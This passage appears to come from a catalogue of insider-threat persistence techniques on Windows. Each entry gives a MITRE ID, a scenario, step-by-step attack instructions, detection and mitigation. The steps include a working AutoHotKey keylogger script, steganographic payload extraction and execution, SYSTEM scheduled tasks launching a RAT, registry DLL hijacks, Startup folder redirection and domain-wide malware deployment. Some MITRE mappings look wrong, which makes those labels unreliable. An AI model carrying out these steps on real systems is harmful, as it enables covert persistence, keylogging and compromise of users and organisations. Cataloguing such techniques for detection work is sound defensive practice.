- **Attack Steps**: Step 1: Enable Chrome Developer Mode in Extensions page.Step 2: Create a folder with manifest.json and background.js.Step 3: In background.js, write a script to exfiltrate data (e.g., URLs visited).Step 4: Load the extension via "Load Unpacked".Step 5: It runs every time browser starts, silently.
- **Detection**: Extension monitoring
- **Solution**: Force extension signing, restrict DevMode
- **Tags**: browser, chrome, persistence

## Persistence via AutoHotKey Script

- **Attack Type**: Scripting Abuse
- **Target**: Windows
- **Vulnerability**: Scripting language misuse
- **MITRE**: T1059.007 (Scripting: AHK)
- **Impact**: Keylogging and local persistence
- **Tools**: AutoHotKey, Startup Folder
- **Scenario**: Insider creates an AHK script to keylog or launch malware, and adds it to startup.
- **Attack Steps**: Step 1: Install AutoHotKey.Step 2: Create a new file monitor.ahk:#PersistentSetTimer, Keylog, 1000ReturnKeylog:Input, key, L1FileAppend, %key%, C:\log.txtStep 3: Save and place shortcut to it in shell:startup.Step 4: It runs and logs keys every login.
- **Detection**: Script monitoring, file writes
- **Solution**: Block scripting tools via policy
- **Tags**: ahk, keylogger, persistence

## Image File as Malware Trigger

- **Attack Type**: Steganography Trigger
- **Target**: Windows Filesystem
- **Vulnerability**: Hidden content inside image
- **MITRE**: T1027.003 (Steganography)
- **Impact**: Covert persistence and execution
- **Tools**: steghide, PowerShell
- **Scenario**: Insider hides a script inside an image file and uses a script to extract and run it.
- **Attack Steps**: Step 1: Use steghide to embed a .ps1 script into a .jpg image.Step 2: Place image in shared folder or desktop.Step 3: Create script trigger.ps1 to extract and run:steghide extract -sf cat.jpg -p "" -xf payload.ps1powershell.exe -File payload.ps1Step 4: Add trigger.ps1 to startup or scheduled task.Step 5: Malware now runs from seemingly harmless image.
- **Detection**: Scan for embedded payloads
- **Solution**: Disable stego tools, monitor images
- **Tags**: stego, image, insider

## Fake Antivirus UI to Lure Trust

- **Attack Type**: GUI Deception
- **Target**: Windows
- **Vulnerability**: User trust in fake tools
- **MITRE**: T1036.003 (Masquerading)
- **Impact**: Long-term keylog or RAT
- **Tools**: Visual Studio, Regedit
- **Scenario**: Insider creates a fake antivirus tool with a UI but secretly logs keystrokes and persists via registry.
- **Attack Steps**: Step 1: Build a fake antivirus in VB or Python with simple UI (“SecureGuard AV”).Step 2: Hide logging or reverse shell in background.Step 3: Add to HKCU\Software\Microsoft\Windows\CurrentVersion\Run as SecureGuard.Step 4: Victims trust it and keep it installed.Step 5: It runs silently at every login.
- **Detection**: Unexpected process checks
- **Solution**: User training, app allowlisting
- **Tags**: fake-av, ui-deception

## Persistence via MSI Installer

- **Attack Type**: Installation-Based
- **Target**: Windows Installer
- **Vulnerability**: Installer logic can add persistence
- **MITRE**: T1070.001 (Installers)
- **Impact**: Background setup of malware
- **Tools**: Advanced Installer, Windows Installer
- **Scenario**: Insider creates a malicious .msi installer and runs it once to set up registry keys, services, or scheduled tasks.
- **Attack Steps**: Step 1: Use "Advanced Installer" or msiexec to create a .msi file.Step 2: Add a custom action to drop a file to startup folder.Step 3: Add registry keys and scheduled tasks via installer.Step 4: Run msiexec /i evil.msi /quiet.Step 5: Persistence is set silently through a legit installer.
- **Detection**: Monitor install paths, registry adds
- **Solution**: Allow signed installers only
- **Tags**: msi, installer, insider

## COM Port Backdoor via Device Driver

- **Attack Type**: Driver Abuse
- **Target**: Windows Driver Stack
- **Vulnerability**: Insecure driver installation
- **MITRE**: T1543.006 (Kernel Modules and Drivers)
- **Impact**: Persistent root access via driver
- **Tools**: Driver Loader, Device Manager
- **Scenario**: Insider installs a fake COM port driver that triggers code when accessed.
- **Attack Steps**: Step 1: Develop or download malicious driver that looks like USB/COM port tool.Step 2: Install using devcon or Device Manager.Step 3: It creates a COM device (e.g., COM5).Step 4: When accessed by terminal apps, the driver triggers payload.Step 5: Hidden and hard to detect without driver review.
- **Detection**: Driver signature checks
- **Solution**: Only signed driver installations
- **Tags**: driver, kernel, insider

## WSL (Windows Subsystem for Linux) Abuse

- **Attack Type**: WSL Shell Persistence
- **Target**: WSL
- **Vulnerability**: Lack of WSL visibility
- **MITRE**: T1543.003 / T1053
- **Impact**: Stealth via hybrid subsystem
- **Tools**: WSL, Bash, Task Scheduler
- **Scenario**: Insider enables WSL, installs Ubuntu, and sets a Linux script to run at Windows startup.
- **Attack Steps**: Step 1: Open CMD and run:wsl --installStep 2: Inside WSL, create ~/auto.sh with malicious payload.Step 3: Back in Windows, create a task:wsl -e bash /home/user/auto.shStep 4: Set task to run at boot/login.Step 5: Linux persistence running under Windows OS.
- **Detection**: WSL process tracking
- **Solution**: Disable WSL if unused
- **Tags**: wsl, linux-shell, insider

## Persistence via ISO File Autorun

- **Attack Type**: Virtual Media Abuse
- **Target**: Virtual Media
- **Vulnerability**: Autorun still functional in some setups
- **MITRE**: T1204.001 (User Execution via Removable Media)
- **Impact**: Executable delivery at boot
- **Tools**: ImgBurn, Explorer
- **Scenario**: Insider mounts ISO image with autorun.inf pointing to malware and ensures it's mounted on boot.
- **Attack Steps**: Step 1: Create ISO image using ImgBurn or PowerISO.Step 2: Add autorun.inf and a malicious EXE inside ISO.Step 3: Mount ISO via diskpart or manually.Step 4: Add mount command in startup script:PowerShell Mount-DiskImage "C:\stealth.iso"Step 5: Each boot mounts ISO, which auto-runs malware.
- **Detection**: Monitor ISO mounts
- **Solution**: Block ISO in policy, disable autorun
- **Tags**: iso, autorun, insider

## NT AUTHORITY\System Account Scheduled Task

- **Attack Type**: Privileged Task Abuse
- **Target**: Windows Task Scheduler
- **Vulnerability**: SYSTEM-level task creation
- **MITRE**: T1053.005 + Priv Esc
- **Impact**: High-priv persistent access
- **Tools**: Task Scheduler, PsExec
- **Scenario**: Insider schedules a task to run as SYSTEM using escalation tools.
- **Attack Steps**: Step 1: Use PsExec to open SYSTEM shell:PsExec64.exe -s -i cmd.exeStep 2: Schedule task:schtasks /create /tn "SysBack" /tr "C:\malware\rat.exe" /sc onlogon /ru SYSTEMStep 3: Task now runs with SYSTEM rights every login.Step 4: Hard to detect without SYSTEM context.
- **Detection**: Audit SYSTEM tasks
- **Solution**: Block PsExec, enforce UAC
- **Tags**: system, scheduler, insider

## Persistence via AppInit_DLLs Registry Key

- **Attack Type**: DLL Injection
- **Target**: Windows Registry
- **Vulnerability**: Legacy DLL injection vector
- **MITRE**: T1546.010 (AppInit DLLs)
- **Impact**: Code execution in every app
- **Tools**: Regedit
- **Scenario**: Insider configures AppInit_DLLs to load malware DLL into all GUI apps on startup.
- **Attack Steps**: Step 1: Open regedit, go to:HKLM\Software\Microsoft\Windows NT\CurrentVersion\WindowsStep 2: Add or edit AppInit_DLLs to value: C:\malicious\stealth.dllStep 3: Set LoadAppInit_DLLs to 1.Step 4: Now, every GUI app loads the DLL at runtime.Step 5: DLL runs stealthily in background always.
- **Detection**: Registry DLL audits
- **Solution**: Disable AppInit_DLLs via policy
- **Tags**: appinit, dll-injection, insider

## Persistence via Startup Registry Shell Folders

- **Attack Type**: Registry Manipulation
- **Target**: Windows Registry
- **Vulnerability**: Redirected startup folder path
- **MITRE**: T1547.001
- **Impact**: Hidden execution on boot
- **Tools**: Regedit
- **Scenario**: Insider modifies the Shell Folders registry key to redirect startup folder to malicious path.
- **Attack Steps**: Step 1: Open regedit.Step 2: Go to HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders.Step 3: Find the value Startup and change its path to C:\MaliciousFolder.Step 4: Place malware in that folder.Step 5: It executes on user login as part of Startup.
- **Detection**: Folder path anomaly detection
- **Solution**: Monitor shell folder paths via policy
- **Tags**: registry, startup, insider

## Persistence via Excel Add-ins

- **Attack Type**: Office Add-in Abuse
- **Target**: Excel
- **Vulnerability**: Add-ins auto-execute silently
- **MITRE**: T1137.006 (Office Add-ins)
- **Impact**: Auto-persistent access through Excel
- **Tools**: Excel, VBA
- **Scenario**: Insider installs a malicious Excel Add-in that executes every time Excel is opened.
- **Attack Steps**: Step 1: Open Excel, go to Developer Tab → Visual Basic.Step 2: Create a new workbook with macro: Auto_Open() that calls PowerShell script.Step 3: Save as .xlam (Excel Add-in format).Step 4: Open Excel Options → Add-ins → Manage → Excel Add-ins → Browse → Select .xlam.Step 5: Now, every time Excel runs, so does the malware.
- **Detection**: Office Add-in logs
- **Solution**: Restrict custom add-ins via GPO
- **Tags**: office, excel, insider

## Malicious Scheduled Task in Group Policy Preferences

- **Attack Type**: GPP Abuse
- **Target**: Domain PCs
- **Vulnerability**: GPP scheduled tasks deployed broadly
- **MITRE**: T1053.005
- **Impact**: Domain-wide persistence
- **Tools**: Group Policy Editor
- **Scenario**: Insider creates a scheduled task using Group Policy Preferences (GPP) across all domain PCs.
- **Attack Steps**: Step 1: Open GPMC and edit an OU-linked GPO.Step 2: Go to Preferences → Control Panel Settings → Scheduled Tasks.Step 3: Create a task to run C:\stealth\payload.exe on logon.Step 4: Mark it as “Hidden” and “Run as SYSTEM”.Step 5: Now this runs on every user in that OU.
- **Detection**: Group Policy logs
- **Solution**: Restrict GPP scheduled tasks
- **Tags**: gpo, scheduled-task, insider

## Registry Backdoor via "ShellServiceObjectDelayLoad"

- **Attack Type**: Registry Abuse
- **Target**: Windows Registry
- **Vulnerability**: Legacy auto-DLL load feature
- **MITRE**: T1546.011
- **Impact**: Automatic background DLL execution
- **Tools**: Regedit
- **Scenario**: Insider uses ShellServiceObjectDelayLoad to inject DLL at Explorer startup.
- **Attack Steps**: Step 1: Go to HKLM\Software\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad.Step 2: Create a new entry: Name = OfficeUpdate, Value = {CLSID}.Step 3: Define CLSID under HKCR\CLSID\{CLSID} to point to malicious DLL path.Step 4: DLL will be loaded each time Explorer starts.
- **Detection**: CLSID registry review
- **Solution**: Disable ShellServiceObjectDelayLoad key
- **Tags**: shell, dll, insider

## Persistence via Fake Desktop Shortcut Replacement

- **Attack Type**: Social Engineering
- **Target**: Windows Desktop
- **Vulnerability**: Misleading shortcut trust
- **MITRE**: T1036.005
- **Impact**: User-assisted malware launch
- **Tools**: File Explorer, Notepad
- **Scenario**: Insider replaces desktop shortcuts (e.g., Chrome) with malware that also opens the real app.
- **Attack Steps**: Step 1: Create a batch file like:start chrome.exestart powershell.exe -File C:\malware.ps1Step 2: Save as chrome.bat and create shortcut Google Chrome.lnk pointing to it.Step 3: Replace original Chrome shortcut on desktop.Step 4: Victim clicks expecting browser, but malware runs too.
- **Detection**: Unexpected shortcut targets
- **Solution**: Block BAT execution, monitor shortcut replacements
- **Tags**: fake-shortcut, insider, persistence

## Persistence via WinRM Autostart Listener

- **Attack Type**: Remote Management Abuse
- **Target**: Windows Remote
- **Vulnerability**: WinRM autostart not audited
- **MITRE**: T1021.006
- **Impact**: Persistent remote shell access
- **Tools**: PowerShell
- **Scenario**: Insider configures WinRM listener to start automatically and bind to malicious script.
- **Attack Steps**: Step 1: Enable WinRM: Enable-PSRemoting -ForceStep 2: Set a startup script via Group Policy or registry that runs PowerShell listener.Step 3: Listener executes a remote-access shell on boot.Step 4: Insider connects remotely anytime over WinRM.
- **Detection**: WinRM port scan, startup script audit
- **Solution**: Disable WinRM or limit to specific IPs
- **Tags**: remote-shell, insider, winrm

## Persistence via Remote Desktop Logon Scripts

- **Attack Type**: RDP Abuse
- **Target**: RDP Sessions
- **Vulnerability**: RDP logon scripts not validated
- **MITRE**: T1037.001
- **Impact**: Stealth trigger via RDP
- **Tools**: GPO or Registry
- **Scenario**: Insider configures logon script for all RDP sessions to trigger malware on connect.
- **Attack Steps**: Step 1: In Group Policy or Registry, add a logon script path:HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Scripts\LogonStep 2: Point it to C:\malware\backdoor.ps1.Step 3: Every RDP session triggers this script silently.Step 4: Malware maintains access and logs RDP users.
- **Detection**: Logon script monitoring
- **Solution**: Limit RDP login scripting
- **Tags**: rdp, insider, script-persistence

## Scheduled Task with Expired Time + Re-trigger

- **Attack Type**: Logic Abuse
- **Target**: Task Scheduler
- **Vulnerability**: Old tasks can still be triggered
- **MITRE**: T1053.005
- **Impact**: Dormant but triggerable persistence
- **Tools**: Task Scheduler, CMD
- **Scenario**: Insider sets task to run once with past date but re-triggers it via log cleanup.
- **Attack Steps**: Step 1: Create a task with date/time in the past.Step 2: Disable history/logging for that task.Step 3: From another script, manually trigger it via:schtasks /run /tn "hiddenUpdate"Step 4: Looks dormant but insider reactivates manually.
- **Detection**: Task config reviews
- **Solution**: Auto-remove expired tasks
- **Tags**: scheduler, stealth, insider

## NTFS Junction Point Redirection for Autorun

- **Attack Type**: Filesystem Redirection
- **Target**: Filesystem
- **Vulnerability**: Junctions are rarely inspected
- **MITRE**: T1203
- **Impact**: Startup folder stealth redirection
- **Tools**: CMD
- **Scenario**: Insider creates junction point in Startup to redirect execution to hidden folder.
- **Attack Steps**: Step 1: Use CMD:mklink /J "C:\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" "C:\Hidden\Startup"Step 2: In C:\Hidden\Startup, place malicious scripts or EXEs.Step 3: On login, Windows follows junction and executes payloads.Step 4: Looks like normal startup path.
- **Detection**: File integrity tools
- **Solution**: Disable junctions in sensitive folders
- **Tags**: junction, filesystem, insider

## Persistence via SCCM (System Center Config Manager) Deployment

- **Attack Type**: Endpoint Management Abuse
- **Target**: SCCM Environment
- **Vulnerability**: Misuse of trusted deployment infra
- **MITRE**: T1072
- **Impact**: Silent org-wide persistence
- **Tools**: SCCM Console, MSI Builder
- **Scenario**: Insider with SCCM console access pushes a silent malware install across managed devices.
- **Attack Steps**: Step 1: Create a fake software deployment package with malicious.msi.Step 2: In SCCM, create an application targeting all users or test group.Step 3: Configure for silent install at logon.Step 4: Deploy and wait for GPO/SCCM policy to push it to targets.Step 5: Malware installed with full trust silently.
- **Detection**: SCCM logs and deployment tracking
- **Solution**: Restrict SCCM console access
- **Tags**: sccm, deployment, insider

